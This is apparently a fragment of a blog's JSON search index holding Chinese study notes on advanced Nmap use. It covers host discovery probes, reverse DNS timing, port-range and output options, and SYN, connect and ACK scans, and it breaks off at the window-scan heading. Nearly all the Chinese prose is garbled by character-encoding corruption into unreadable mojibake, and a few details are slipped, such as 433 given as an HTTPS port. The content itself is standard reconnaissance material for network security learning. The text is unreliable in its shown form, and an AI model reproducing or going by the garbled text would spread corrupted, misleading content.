","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.1 ç›®æ ‡åˆ—ä¸¾ â€‹ ç›®æ ‡åˆ—ä¸¾è¿™é‡Œå°±æ˜¯å°†CIDRç±»è§£æä¸ºIPåœ°å€åˆ—è¡¨ï¼Œå¦‚æœæœ‰åŸŸåçš„è¯ï¼Œéœ€è¦è¿›è¡ŒDNSè§£æå°†åŸŸåè½¬åŒ–ä¸ºIPåœ°å€ã€‚é»˜è®¤æƒ…å†µä¸‹, Nmap ä¼šé€šè¿‡ resolv.conf æ–‡ä»¶ (Unix)å’Œæ³¨å†Œè¡¨ (Win32) æ¥ç¡®å®šä½¿ç”¨çš„DNSè§£æå™¨ï¼Œä¼šå‘ä¸»æœºä¸Šé…ç½®çš„åŸŸåæœåŠ¡å™¨è¿›è¡Œè§£æIPåœ°å€ã€‚Nmapæœ‰ä¸¤ä¸ªåŠŸèƒ½é€‰é¡¹æ”¯æŒæ§åˆ¶DNSè§£ææœåŠ¡å™¨ï¼Œåˆ†åˆ«ä¸º--system-dns å’Œ --dns-servers \u003cserver1\u003e[,\u003cserver2\u003e[,...]]ï¼Œæ¨èä½¿ç”¨åè€…ï¼ŒåŸå› åé¢å†è¯´ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:1","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.2 ä¸»æœºå‘ç° â€‹ ä¸»æœºå‘ç°é»˜è®¤ä½¿ç”¨å¤šç§ping æ‰«ææŠ€æœ¯æ¢é’ˆåŒæ—¶æ¢æµ‹ï¼ŒåŒ…æ‹¬æœ‰ï¼š-PE -PS443 -PA80 -PP é€‰é¡¹ã€‚æ„å‘³ç€å¯¹æ¯ä¸ªæœºå™¨å‘é€ä¸€ä¸ªICMP echo è¯·æ±‚ï¼Œä¸€ä¸ª TCP SYN åŒ…ï¼Œä¸€ä¸ª TCP ACK åŒ…ï¼Œå’Œä¸€ä¸ª ICMP æ—¶é—´æˆ³è¯·æ±‚åŒ…ã€‚å¦‚æœæ˜¯å¯¹ç§æœ‰åœ°å€ï¼Œè¿˜ä¼šä½¿ç”¨-PRï¼Œarpæ‰«æè¿›è¡Œæ¢æµ‹ã€‚ â€‹ --packet-traceå…è®¸æˆ‘ä»¬æŸ¥çœ‹Nmapæ‰€å‘èµ·çš„æ•°æ®åŒ…æµï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªé€‰é¡¹æ¥è¿›è¡ŒéªŒè¯ï¼Œå¦‚å›¾ï¼š â€‹ æ ¹æ®å®éªŒæˆ‘ä»¬å¯ä»¥å¾—å‡ºNmapä¸»æœºå‘ç°æ¢æµ‹çš„é¡ºåºï¼Œä»»æ„æ¢æµ‹æ”¶åˆ°ç›®æ ‡ä¸»æœºçš„å“åº”åå°†åœæ­¢ä¸»æœºå‘ç°é˜¶æ®µï¼Œä¸åœ¨å‘é€å…¶ä»–æ¢é’ˆï¼›å¯¹äºæœªæ”¶åˆ°å“åº”çš„ä¸»æœºï¼ŒNmapä¼šè¿›è¡Œ1æ¬¡é‡æ”¾ï¼Œä»¥é˜²å› ç½‘ç»œå› ç´ å¼•èµ·çš„è¶…æ—¶ä¸¢åŒ…ç­‰å½±å“åˆ¤æ–­ã€‚å¯¹ç§æœ‰åœ°å€åˆ™ä¼šé‡‡ç”¨ARPè¿›è¡Œæ¢æµ‹ã€‚ â€‹ Nmap æ”¯æŒå¤šç§ä¸»æœºå‘ç°æŠ€æœ¯ï¼Œå¯ä»¥ç”¨ -h æŸ¥çœ‹ HOST DISCOVERY å­—æ®µï¼Œæ”¯æŒçš„æŠ€æœ¯é€‰é¡¹æœ‰ï¼š-PS/PA/PU/PYï¼Œ-PE/PP/PMï¼Œ-POï¼Œæ³¨æ„ï¼šå¦‚æœä½ æŒ‡å®šäº†ä»»ä½• -P é€‰é¡¹ï¼Œå®ƒä¼šæ›¿æ¢é»˜è®¤çš„å‘ç°æ¢é’ˆï¼Œè€Œä¸æ˜¯åœ¨é»˜è®¤åŸºç¡€ä¸Šå¢åŠ æ–°çš„æ¢é’ˆç±»å‹ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:2","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.3 åå‘DNSè§£æ â€‹ Nmapä¼šå°†å­˜æ´»ä¸»æœºåˆ—è¡¨ä¼ å…¥è¿™ä¸ªé˜¶æ®µè¿›è¡Œåå‘DNSè§£æï¼Œé€šè¿‡è§£æå‡ºçš„ä¸»æœºåç§°ï¼Œç”¨æˆ·å¯ä»¥æ¨æµ‹è¯¥ä¸»æœºçš„ç”¨é€”ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š â€‹ ä»ç»“æœæˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºï¼Œè¯¥IPæ˜¯é˜¿é‡Œçš„å…¬å…±DNSæœåŠ¡å™¨ã€‚ â€‹ åŒæ—¶æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå¯¹ä¸€ä¸ªIPçš„åå‘è§£æç”¨æ—¶0.07sï¼Œå¦‚æœæ˜¯å¯¹å¤šä¸ªIPè¿™ä¸ªæ—¶é—´å°†ä¼šæ›´é•¿ï¼ŒDNSè§£æä¼šå½±å“æ‰«ææ—¶é•¿ã€‚ä¾‹å¦‚æˆ‘å¯¹223.5.5.5-10å…±6ä¸ªIPè¿›è¡Œæ¢æµ‹ï¼Œåœ¨åå‘DNSè§£æä¸Šå°±éœ€è¦èŠ±è´¹2.63ç§’ã€‚ â€‹ ä¸ºä»€ä¹ˆ1ä¸ªIPåªè¦0.07sï¼Œè€Œ6ä¸ªå´è¦2.63sï¼Œç›¸å·®é‚£ä¹ˆå¤šï¼ŸåŸå› å…¶å®å¾ˆç®€å•ï¼Œå¦‚æœä½ äº†è§£DNSçš„è§£æè¿‡ç¨‹å°±åº”è¯¥æŒ‡å®šï¼Œå½“æœ¬åœ°DNSè§£æä¸åˆ°ï¼Œå®ƒä¼šå‘å…¶ä»–DNSè¿›è¡ŒæŸ¥è¯¢ï¼Œ223.5.5.5æ˜¯ä¸€ä¸ªç›¸å¯¹çŸ¥åçš„ä¸»æœºï¼Œå¾ˆå·®å¾ˆå¤šDNSæœåŠ¡å™¨éƒ½ä¼šæœ‰æ”¶å½•ï¼Œè§£æå°±å¿«ï¼Œè€Œå…¶ä»–IPå°±æ²¡æœ‰çŸ¥ååº¦ï¼Œéœ€è¦å‘å…¶ä»–DNSè¿›è¡ŒæŸ¥è¯¢ï¼ŒNmapéœ€è¦ç­‰å¾…ç¬¬ä¸‰æ–¹è¿”å›ç»“æœï¼Œè€—æ—¶å°±å¤§å¤§å¢åŠ äº†ã€‚ â€‹ è¿™é‡Œæ¥è§£é‡Šä¸€ä¸‹--system-dns å’Œ --dns-servers \u003cserver1\u003e[,\u003cserver2\u003e[,...]]çš„åŒºåˆ«ï¼Œå‰è€…æ˜¯é™å®šä½¿ç”¨ç³»ç»ŸDNSè§£æå™¨ï¼Œèµ„æºæœ‰é™ï¼›è€Œåè€…å¯ä»¥æ‰‹åŠ¨æŒ‡å®šDNSæœåŠ¡å™¨ä¸”å…è®¸å¤šä¸ªï¼Œå°¤å…¶æ˜¯æŒ‡å®šä¸€äº›çŸ¥åæœåŠ¡å™¨æ—¶ï¼Œè§£æé€Ÿåº¦ä¼šç›¸å¯¹åŠ å¿«ä¸€äº›ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:3","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.4 ç«¯å£æ‰«æ â€‹ Nmap é»˜è®¤çš„ç«¯å£æ‰«ææŠ€æœ¯æ˜¯SYNæ¢æµ‹ï¼Œå¯¹åº”çš„é€‰é¡¹æ˜¯ -sSï¼Œè¿™è¢«ç§°ä¸ºTCP åŠè¿æ¥ï¼ŒåŸç†ç½‘ä¸Šè‡ªæŸ¥ï¼Œå¾ˆå¤šæ‰«æå™¨éƒ½ä¼šç”¨è¿™ç§æ–¹å¼è¿›è¡Œæ¢æµ‹ï¼Œå› æ­¤å¾ˆå¤šIDSéƒ½èƒ½æ£€æµ‹åˆ°ã€‚å…¶ä»–ç«¯å£æ‰«ææŠ€æœ¯å¯è§ nmap -h ä¸­ SCAN TECHNIQUES ä¸€èŠ‚ï¼Œå®ƒç»™å‡ºäº†æŠ€æœ¯åç§°ï¼Œç›¸ä¿¡ç½‘ä¸Šèƒ½æœåˆ°ç›¸åº”çš„æŠ€æœ¯åŸç†ã€‚ã€ŠNmap Network Scanningã€‹ç¬¬äº”ç« ï¼šç«¯å£æ‰«ææŠ€æœ¯å’Œç®—æ³•è¯¦ç»†ä»‹ç»äº†å„ç§æ‰«ææŠ€æœ¯åŠåŸç†ã€‚ â€‹ Nmap é»˜è®¤é…ç½®æ˜¯æ‰«ææœ€å¸¸è§çš„1000ä¸ªç«¯å£ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰äººè·Ÿæˆ‘ä¸€æ ·å¥½å¥‡è¿‡è¿™æœ€å¸¸è§çš„1000ä¸ªç«¯å£åˆ°åº•æ˜¯å“ªäº›ç«¯å£å‘¢ï¼Ÿnmap-servicesæ–‡ä»¶ä¸­å°±è®°å½•ç€ï¼Œhttps://nmap.org/book/nmap-services.html ç»™å‡ºäº†å¦‚ä½•é˜…è¯»å’Œç†è§£è¯¥æ–‡ä»¶ï¼Œæ¯ä¸€è¡Œè¡¨ç¤ºåœ¨ç›¸åº”ç«¯å£å‘ç°ç‰¹å®šæœåŠ¡çš„å¯èƒ½æ€§ï¼ŒNmapçš„è¿™ä¸ªæœ€å¸¸è§çš„1000ä¸ªå°±æ˜¯åŸºäºè¿™ä¸ªæ–‡ä»¶å¾—å‡ºçš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªæ–‡ä»¶å»ç»Ÿè®¡ä¸€ä¸‹å„ç«¯å£çš„é¢‘ç‡ï¼Œä½†æ˜¯æˆ‘æ²¡å»åšï¼Œæ‰€ä»¥æˆ‘è¿˜æ˜¯ä¸çŸ¥é“æœ€å¸¸è§çš„1000ä¸ªæ˜¯å“ªäº›ç«¯å£ ğŸ˜† ã€‚ â€‹ å¯¹äºæ‰«æçš„ç«¯å£èŒƒå›´ï¼ŒNmapæä¾›äº†å‡ ä¸ªæ§åˆ¶é€‰é¡¹ã€‚ â€‹ -pé€‰é¡¹ï¼Œç”¨æˆ·æŒ‡å®šæ‰«æèŒƒå›´ï¼ŒæŒ‡å®šç‰¹å®šçš„ç«¯å£ï¼Œå¦‚ -p 80,443ï¼Œnmapè¿˜æ”¯æŒæŒ‡å®šåè®®åç§°å»æŸ¥è¯¢æœ€å¯èƒ½å‡ºç°çš„ç«¯å£ï¼Œå¦‚ -p http,httpsï¼ŒNmapä¼šæ¢æµ‹80ï¼Œ8008å’Œ433ç«¯å£ã€‚åŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡nmap-servicesæ–‡ä»¶æŸ¥è¯¢ã€‚è¿™é‡Œè¿˜æ”¯æŒé€šé…ç¬¦ï¼Œä¾‹å¦‚-p *htttpï¼Œç»“æœå¦‚ä¸‹ï¼š â€‹ --exclude-ports é€‰é¡¹ï¼Œæ’é™¤ç‰¹å®šç«¯å£ï¼Œä¸è¿›è¡Œæ‰«æï¼› â€‹ -Fé€‰é¡¹ï¼Œfastæ¨¡å¼ï¼Œæ‰«ææœ€å¸¸è§çš„100ä¸ªç«¯å£ï¼› â€‹ -r é€‰é¡¹ï¼Œæ§åˆ¶ç«¯å£ä»å°åˆ°å¤§ä¾æ¬¡è¿›è¡Œæ‰«æï¼Œè€Œä¸æ˜¯éšæœºé€‰æ‹©ã€‚ â€‹ --top-ports \u003cnumber\u003e é€‰é¡¹ï¼Œæ‰«ææœ€å¸¸è§çš„æŒ‡å®šæ•°é‡ä¸ªç«¯å£ã€‚å‰ n ä¸ªç«¯å£æ˜¯ç”±Â /usr/share/nmap/nmap-servicesæ–‡ä»¶ç¡®å®šçš„ã€‚æœ‰æ—¶å€™ä¸ºäº†å…¨é¢çš„ç›®æ ‡ä¸»æœºçš„ç«¯å£çŠ¶æ€ï¼Œä¼šè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œä»¥å…é—æ¼æ”»å‡»é¢ã€‚NNSä¸€ä¹¦ç¬¬å…­ç« ï¼Œä¼˜åŒ–Nmapæ€§èƒ½ï¼šç«¯å£é€‰æ‹©æ•°æ®å’Œç­–ç•¥ä¸­ï¼Œç»™å‡ºäº†ä¸€å¼ å…³äºç«¯å£æ‰«ææ•°é‡å’Œæœ‰æ•ˆæ€§çš„è¡¨æ ¼ï¼ŒTCPä»…éœ€æ‰«æ3328ä¸ªç«¯å£å°±èƒ½è¾¾åˆ°99%çš„æ•ˆç‡ï¼ŒUDPä»…éœ€15094ä¸ªï¼Œè€Œè¾¾åˆ°100%åˆ™éœ€è¦65536å…¨ç«¯å£æ‰«æã€‚å› æ­¤æ˜¯ä¸ºäº†ä¿è¯å‡†ç¡®ç‡ä»…éœ€å…¨ç«¯å£æ‰«æï¼Œè¿˜æ˜¯ç‰ºç‰²1ç‚¹å‡†ç¡®ç‡æ¢å–æ›´çŸ­çš„æ‰«ææ—¶é•¿ï¼Œå–å†³äºä¸ªäººé€‰æ‹©ã€‚ â€‹ --port-ratio \u003cratio\u003e é€‰é¡¹ï¼Œæ§åˆ¶åªæ‰«æå¯èƒ½æ€§å¤§äºæŒ‡å®šratioçš„ç«¯å£ï¼ŒåŒæ ·æ ¹æ® nmap-services æ–‡ä»¶ç»Ÿè®¡æ•°æ®ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:4","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.5 ç»“æœè¾“å‡º â€‹ é»˜è®¤ç»“æœæ˜¯è¾“å‡ºåˆ°å‘½ä»¤è¡Œç•Œé¢ã€‚å…¶ä»–å¯¹è¾“å‡ºçš„æ§åˆ¶é€‰é¡¹æœ‰ï¼š è¾“å‡ºæ–‡ä»¶ç±»å‹æ§åˆ¶ï¼š â€‹ -oN é€‰é¡¹ï¼Œä»¥äººç±»å¯è¯»çš„æ™®é€šæ¨¡å¼ï¼ˆä¸å‘½ä»¤è¡Œç•Œé¢çš„è¾“å‡ºç»“æœä¸€è‡´ï¼‰ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ï¼› â€‹ -oX é€‰é¡¹ï¼Œè¾“å‡ºä¸ºXMLæ–‡ä»¶æ ¼å¼ã€‚å› ä¸ºXMLçš„åŠŸèƒ½æ€§ï¼Œæ˜“ä¸å…¶ä»–å·¥å…·è¿›è¡Œè”åŠ¨ï¼› â€‹ -oS é€‰é¡¹ï¼Œè¾“å‡ºä¸ºâ€œè„šæœ¬å°å­â€æ ¼å¼ï¼ˆScript kiddieï¼‰ï¼Œè¾“å‡ºå†…å®¹ä¼šæœ‰å¤§å°å†™äº¤å‰ï¼Œéƒ¨åˆ†å­—æ¯ç”±å…¶ä»–ç¬¦å·ä»£æ›¿ï¼›ä½œè€…åŸè¯ï¼š It is simply a joke making fun of the script kiddiesâ€”they donâ€™t actually use this mode (I hope). â€‹ -oG é€‰é¡¹ï¼Œè¾“å‡ºä¸ºé€‚åˆGrepçš„æ ¼å¼ï¼Œè¯¥æ ¼å¼æ›´é€‚åˆåœ¨Unixç¯å¢ƒä¸‹ä½¿ç”¨Grepå‘½ä»¤æ¥è·å–æ•°æ®ã€‚ â€‹ -oA é€‰é¡¹ï¼ŒåŒæ—¶è¾“å‡ºNormalï¼ˆ-oNï¼‰ã€XMLï¼ˆ-oXï¼‰ã€Grepableï¼ˆ-oG ï¼‰æ ¼å¼æ–‡ä»¶ã€‚ â€‹ Nmapçš„è¿™äº›å‚æ•°éƒ½æ”¯æŒåœ¨æ–‡ä»¶åä¸­ä½¿ç”¨ç±»ä¼¼strftimeçš„è½¬æ¢ï¼Œ %H, %M, %S, %m, %d, %y,å’Œ%Y å®Œå…¨ä¸€è‡´ï¼Œ%T ç­‰åŒäº %H%M%Sï¼ˆæ—¶åˆ†ç§’ï¼‰ï¼Œ%R ç­‰åŒäº%H%M, ï¼Œ %D ç­‰åŒäº %m%d%yï¼ˆæœˆæ—¥å¹´ï¼‰ã€‚å› æ­¤ -oX 'scan-%T-%D.xml' ä¼šç”Ÿæˆæ–‡ä»¶åä¸º scan-144840-121307.xml çš„XMLæ–‡ä»¶ã€‚ â€‹ Normalå’ŒGrepableæ ¼å¼çš„æ–‡ä»¶ï¼Œæ”¯æŒä¸­æ–­æ‰«æåç»§ç»­æ‰«æï¼Œå‘½ä»¤ä¸º nmap --resume \u003cfilename\u003eï¼ŒXMLæ–‡ä»¶è¾“å‡ºä¸æ”¯æŒï¼ŒåŸå› æ˜¯XMLæ–‡ä»¶è¿½åŠ å†…å®¹æ›´éš¾ã€‚ â€‹ â€“append-output é€‰é¡¹ï¼Œåœ¨æŒ‡å®šæ–‡ä»¶åé¢è¿½åŠ å†…å®¹ã€‚ä¸Šè¿°çš„ -oN ä¹‹ç±»é€‰é¡¹é»˜è®¤ä¼šè¦†ç›–æŒ‡å®šæ–‡ä»¶ï¼Œå½“ä½ æƒ³ä¿ç•™åŸæ–‡ä»¶ï¼Œåœ¨åé¢é™„åŠ æ–°ç»“æœæ—¶ï¼Œç”¨è¿™ä¸ªé€‰é¡¹ã€‚åŒæ ·ä¹Ÿä¸é€‚åˆ -oX é€‰é¡¹ï¼Œå› ä¸ºä»–ä¼šå¯¼è‡´XMLæ–‡ä»¶è§£æå¤±è´¥ï¼Œéœ€è¦æ‰‹åŠ¨ä¿®å¤ã€‚ è¾“å‡ºä¿¡æ¯æ§åˆ¶ â€‹ -v é€‰é¡¹ï¼Œæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥ -vv æˆ–-v2 è·å–æ›´è¯¦ç»†ä¿¡æ¯ï¼› â€‹ -d é€‰é¡¹ï¼Œæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼Œå¯ä»¥ -dd æˆ– -d2 è·å–æ›´è¯¦ç»†çš„è°ƒè¯•ä¿¡æ¯ï¼› â€‹ â€“packet-trace é€‰é¡¹ï¼Œæ˜¾ç¤ºæ•°æ®åŒ…è¿½è¸ªï¼› â€‹ å…¶ä»–è¿˜æœ‰ â€“reasonã€â€“openã€â€“iflistã€â€“stylesheetã€â€“webxmlã€-no-stylesheet ï¼Œå¯ä»¥æŸ¥çœ‹nmap -h ï¼Œæ²¡ä»€ä¹ˆè¦è¯´æ˜çš„å†…å®¹ã€‚ å‘½ä»¤è¡Œäº¤äº’å¼æ§åˆ¶ â€‹ åœ¨æ‰«æè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡æŒ‰é”®è¿›è¡Œäº¤äº’å¼æ§åˆ¶ï¼Œè°ƒæ•´Nmapåœ¨å‘½ä»¤è¡Œç•Œé¢çš„è¾“å‡ºä¿¡æ¯ã€‚nmapè¿è¡Œæ—¶ï¼Œæ‰€æœ‰æŒ‰é”®éƒ½ä¼šè¢«æ•è·ã€‚è¿™å…è®¸æ‚¨ä¸ç¨‹åºäº¤äº’è€Œæ— éœ€ä¸­æ­¢å’Œé‡æ–°å¯åŠ¨å®ƒã€‚æŸäº›ç‰¹æ®Šé”®å°†æ›´æ”¹é€‰é¡¹ï¼Œè€Œä»»ä½•å…¶ä»–é”®å°†æ‰“å°å‡ºä¸€æ¡çŠ¶æ€æ¶ˆæ¯ï¼Œå‘Šè¯‰æ‚¨æœ‰å…³æ‰«æçš„ä¿¡æ¯ã€‚é€šå¸¸æ˜¯å°å†™å­—æ¯å¢åŠ æ‰“å°é‡ï¼Œå¤§å†™å­—æ¯å‡å°‘æ‰“å°é‡ã€‚æ‚¨ä¹Ÿå¯ä»¥æŒ‰â€œ?â€å¯»æ±‚å¸®åŠ©ã€‚ v/V å¢åŠ /å‡å°‘è¯¦ç»†ç¨‹åº¦è¾“å‡ºï¼Œå¯¹åº” -vé€‰é¡¹åŠŸèƒ½ d/D å¢å¤§/å‡å°è°ƒè¯•çº§åˆ«ï¼Œå¯¹åº” -dé€‰é¡¹åŠŸèƒ½ p/P æ‰“å¼€/å…³é—­æ•°æ®åŒ…è·Ÿè¸ªï¼Œå¯¹åº” --packet-trace é€‰é¡¹åŠŸèƒ½ ? æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:5","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.6 å°ç»“ â€‹ å›å½’åˆ°é—®é¢˜ï¼ŒNmap åŒ…å«äº†å“ªäº›é»˜è®¤é€‰é¡¹ï¼Œå¦‚æ‰§è¡Œäº†å“ªäº›æ¢æµ‹æŠ€æœ¯ç­‰ï¼Ÿ â€‹ Nmap 1.1.1.1 åŒ…å«çš„ -PEï¼ˆICMP Echoæ¢æµ‹ï¼‰ï¼Œ-PS443ï¼ˆå¯¹443ç«¯å£æ˜¯SYNæ¢æµ‹ï¼‰ï¼Œ-PA80ï¼ˆå¯¹80ç«¯å£çš„ACKæ¢æµ‹ï¼‰ï¼Œ-PPï¼ˆICMP æ—¶é—´æˆ³æ¢æµ‹ï¼‰ä¸»æœºå‘ç°æŠ€æœ¯ï¼Œåå‘DNSè§£ææŠ€æœ¯ï¼Œ-sSï¼ˆSYNæ¢æµ‹ï¼‰ç«¯å£æ‰«ææŠ€æœ¯æ‰«æ1000ä¸ªç«¯å£ï¼Œå°†ç»“æœè¾“å‡ºåˆ°äº¤äº’å¼å‘½ä»¤è¡Œä¸­ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:6","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x04 ç«¯å£æ‰«ææŠ€æœ¯ ä¸»æœºå‘ç°æŠ€æœ¯çš„åŸç†ä¸è¯´äº† Nmapçš„ç«¯å£æ¢æµ‹æŠ€æœ¯çŸ¥é“å¤šå°‘ç§ï¼Œå¯¹åº”çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ï¼Ÿ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.1 -sS SYNæ‰«æ â€‹ -sS SYNæ‰«æï¼ŒåŠè¿æ¥æ‰«æï¼Œä¼˜ç‚¹æ˜¯æ‰«æé€Ÿåº¦å¿«ï¼Œä¸å®¹æ˜“è¢«è®°å½•ï¼Œé€‚ç”¨äºä»»ä½•å…¼å®¹TCPå †æ ˆï¼Œå¯ä»¥æ¸…æ™°å¯é åœ°åŒºåˆ†ç«¯å£å¼€å¯ã€å…³é—­å’Œè¿‡æ»¤çŠ¶æ€ã€‚ä½†éœ€è¦rootæƒé™å»æ„é€ åŸå§‹æ•°æ®åŒ…ï¼Œç›®å‰IDSå¯ä»¥æ£€æµ‹åˆ°è¿™ç§æ‰«ææ–¹å¼ã€‚ â€‹ åŸç†ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨äº†TCPä¸‰æ¬¡æ¡æ‰‹ï¼Œå‘ç›®æ ‡å‘é€SYNæ•°æ®åŒ…ï¼Œ â€‹ è‹¥æ”¶åˆ°SYN/ACKè¿”å›ï¼Œåˆ™ç«¯å£å¼€æ”¾ï¼Œå‘é€RSTåŒ…ç»ˆæ­¢å»ºç«‹è¿æ¥ï¼ˆå›¾5.2ï¼‰ï¼› â€‹ è‹¥æ”¶åˆ°RSTè¿”å›åŒ…ï¼Œåˆ™ç›®æ ‡ç«¯å£å…³é—­ï¼ˆå›¾5.3ï¼‰ï¼› â€‹ è‹¥ç›®æ ‡æ— å“åº”ï¼Œåˆ™è¯¥ç«¯å£å¯èƒ½è¢«è¿‡æ»¤ï¼ˆå›¾5.4ï¼‰ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:1","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.2 -sT TCP è¿æ¥æ‰«æ â€‹ -sT TCP connect è¿æ¥æ‰«æï¼Œå»ºç«‹å®Œæ•´çš„è¿æ¥ï¼Œä¼šè¢«æ—¥å¿—ã€IDSç­‰è®°å½•ã€‚ â€‹ è¿™é€šå¸¸æ˜¯éé«˜æƒé™ç”¨æˆ·çš„é»˜è®¤æ‰«ææ–¹å¼ï¼ŒNmapä¼šè°ƒç”¨ç³»ç»Ÿåº•å±‚çš„connectä¸ç›®æ ‡ç«¯å£å»ºç«‹è¿æ¥ã€‚ä¸€æ¬¡å®Œæ•´çš„è¿æ¥å»ºç«‹è¿‡ç¨‹éœ€è¦SYNã€SYN/ACKã€ACKã€Dataã€RST 5ä¸ªæ•°æ®åŒ…ï¼Œé€Ÿåº¦æ¯”SYNæ…¢ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:2","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.3 -sA ACKæ‰«æ â€‹ -sA ACKæ‰«æï¼Œé€‚åˆç”¨æ¥æ˜ å°„é˜²ç«å¢™è§„åˆ™ã€‚ â€‹ ACKæ‰«æä¸èƒ½ç¡®å®šç«¯å£ä¸ºå¼€å‘çŠ¶æ€ï¼Œå¯ä»¥ç”¨äºæ˜ å°„é˜²ç«å¢™è§„åˆ™é›†ï¼Œç¡®å®šæ˜¯å¦æœ‰çŠ¶æ€ç›‘æµ‹é˜²ç«å¢™ï¼Œä»¥åŠå¯¹å“ªäº›ç«¯å£è¿›è¡Œäº†è¿‡æ»¤ã€‚å½“æ‰«æè¢«è¿‡æ»¤ç³»ç»Ÿæ—¶ï¼Œæ— è®ºæ˜¯å¼€å¯æˆ–å…³é—­çš„ç«¯å£éƒ½ä¼šè¿”å›RSTæ•°æ®åŒ…ï¼Œåˆ™Nmapä¼šæ ‡è®°ä¸º unfiltered ï¼›è‹¥ç«¯å£æ²¡æœ‰å“åº”åŒ…æˆ–æ”¶åˆ°ICMPä¸å¯è¾¾æŠ¥é”™ï¼Œåˆ™æ ‡è®°ä¸º filteredã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:3","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.4 -sW çª—å£æ‰«æ 